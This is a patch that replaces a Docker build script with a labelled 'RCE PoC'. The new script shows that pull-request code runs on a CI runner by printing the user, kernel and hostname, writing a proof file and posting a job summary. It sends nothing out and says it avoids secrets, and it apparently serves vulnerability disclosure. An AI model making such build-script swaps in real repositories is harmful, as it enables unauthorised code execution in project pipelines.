*** Begin Patch
*** Update File: docker/rosetta/docker-build-rosetta.sh
@@
-#!/usr/bin/env bash
-set -euxo pipefail
-
-# Minimal "benign" build, just to have a baseline
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-DOCKERFILE="${SCRIPT_DIR}/rosetta.Dockerfile"
-
-docker build -f "${DOCKERFILE}" -t rosetta:test "${SCRIPT_DIR}"
-echo "[baseline] built rosetta:test"
+#!/usr/bin/env bash
+set -euxo pipefail
+
+echo "[ROSETTA-POC] Hello from PR-controlled script"
+echo "[ROSETTA-POC] whoami=$(whoami)"
+echo "[ROSETTA-POC] uname=$(uname -a)"
+echo "[ROSETTA-POC] hostname=$(cat /etc/hostname || true)"
+
+# Proof file in the runner workspace (visible in job logs and artifacts if you choose to upload)
+echo "PR-controlled code ran at $(date -u +"%Y-%m-%dT%H:%M:%SZ") on run $GITHUB_RUN_ID" > RCE_PROOF.txt
+ls -la RCE_PROOF.txt
+
+# Add a visible job summary (no secrets involved)
+{
+  echo "### RCE PoC (no Docker)"
+  echo "- Ran as: \`$(whoami)\`"
+  echo "- Hostname: \`$(cat /etc/hostname || echo n/a)\`"
+  echo "- Proof file: \`$PWD/RCE_PROOF.txt\`"
+} >> "$GITHUB_STEP_SUMMARY"
+
+# IMPORTANT: do NOT invoke docker here (keep test safe and self-contained)
+exit 0
*** End Patch
